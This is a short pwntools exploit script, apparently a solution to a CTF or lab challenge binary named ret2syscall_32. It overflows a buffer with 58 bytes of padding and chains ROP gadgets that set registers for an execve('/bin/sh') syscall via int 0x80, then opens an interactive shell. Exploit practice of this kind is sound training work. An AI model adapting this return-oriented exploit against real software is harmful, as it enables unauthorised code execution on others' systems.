from pwn import *

p = process("./ret2syscall_32")
# context.terminal = ["tmux","sp","-h"]
# context.log_level = "debug"
# gdb.attach(p)
offset = 58

pop_eax_ret = 0x08049182
pop_ebx_ret = 0x08049022
pop_ecx_ret = 0x08049184
pop_edx_ret = 0x08049186
int_80 = 0x08049180

binsh = 0x0804c01c

payload = flat([b'a'*offset,p32(pop_eax_ret),0xb,p32(pop_ebx_ret),p32(binsh),p32(pop_ecx_ret),0,p32(pop_edx_ret),0,p32(int_80)])


p.sendline(payload)

p.interactive()



